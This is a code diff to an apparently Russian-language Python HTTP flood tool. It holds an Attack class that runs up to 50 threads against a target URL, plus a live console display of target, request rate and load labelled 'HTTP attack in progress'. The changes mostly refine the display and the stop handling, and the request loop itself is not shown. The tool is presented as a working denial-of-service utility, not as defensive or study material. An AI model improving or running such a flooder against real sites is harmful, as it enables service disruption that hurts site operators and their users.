@@ -1,3 +1,4 @@
+
 import os
 import sys
 import time
@@ -8,9 +9,8 @@ import requests
 from datetime import datetime
 
 # ================= НАСТРОЙКИ =================
-MAX_THREADS = 50  # НЕ СТАВЬ БОЛЬШЕ 50, ЧТОБЫ ПК НЕ СГОРЕЛ
+MAX_THREADS = 50
 TIMEOUT = 3
-SAVE_STATS = True
 
 # ================= ЦВЕТА =================
 G1 = "\033[38;2;0;60;0m"
@@ -20,11 +20,8 @@ G4 = "\033[38;2;0;160;0m"
 G5 = "\033[38;2;0;200;0m"
 G6 = "\033[38;2;0;230;0m"
 G7 = "\033[38;2;50;255;50m"
-GW = "\033[38;2;200;255;200m"
 R = "\033[91m"
 G = "\033[92m"
-Y = "\033[93m"
-C = "\033[96m"
 W = "\033[97m"
 E = "\033[0m"
 
@@ -56,7 +53,7 @@ def save_history(entry):
 def clear():
     os.system('cls' if os.name == 'nt' else 'clear')
 
-def safe_int(prompt, default=50, min_val=1, max_val=50):
+def safe_int(prompt, default=30, min_val=1, max_val=50):
     while True:
         u = input(prompt)
         if u == "":
@@ -91,7 +88,7 @@ def banner():
 {E}
 """)
 
-# ================= HTTP-АТАКА (БЕЗ ЗВУКОВ) =================
+# ================= HTTP-АТАКА =================
 class Attack:
     def __init__(self):
         self.running = False
@@ -137,24 +134,26 @@ class Attack:
             t.start()
             threads_list.append(t)
         
+        while self.running:
+            time.sleep(0.1)
+        
         for t in threads_list:
             t.join(timeout=0.1)
 
     def stop(self):
         self.running = False
 
-# ================= ОБНОВЛЕНИЕ ЭКРАНА (БЕЗ МИГАНИЯ) =================
-def attack_view(url, threads, a, atype="HTTP"):
-    sys.stdout.write("\033[H")
-    sys.stdout.flush()
-    
+# ================= ПРОСТОЙ ВЫВОД (БЕЗ СЪЕХАВШЕГО ЭКРАНА) =================
+def attack_view(url, threads, a):
     elapsed = int(time.time() - a.start)
     rate = int(a.req / elapsed) if elapsed > 0 else 0
     load = min(100, int((rate / (threads * 3)) * 100)) if threads > 0 else 0
     stats = load_stats()
     
+    # Простой вывод без лишних символов
+    clear()
     print(f"""
-{G6}{atype} АТАКА В ПРОЦЕССЕ
+{G7}HTTP АТАКА В ПРОЦЕССЕ
 
 {G5}Цель      : {W}{url[:30]}
 {G4}Потоки    : {W}{threads}
@@ -175,7 +174,7 @@ def attack_view(url, threads, a, atype="HTTP"):
 {E}
 """)
 
-# ================= ЗАПУСК АТАКИ =================
+# ================= ЗАПУСК =================
 def run_test():
     clear()
     banner()
@@ -193,17 +192,15 @@ def run_test():
     def wait():
         input()
         stop[0] = True
+        a.stop()
     threading.Thread(target=wait, daemon=True).start()
-    
-    # Печатаем баннер один раз
-    banner()
     
     try:
         while a.running and not stop[0]:
-            attack_view(url, threads, a, "HTTP")
+            attack_view(url, threads, a)
             time.sleep(0.3)
     except KeyboardInterrupt:
-        pass
+        a.stop()
     
     a.stop()
     t.join(timeout=0.5)
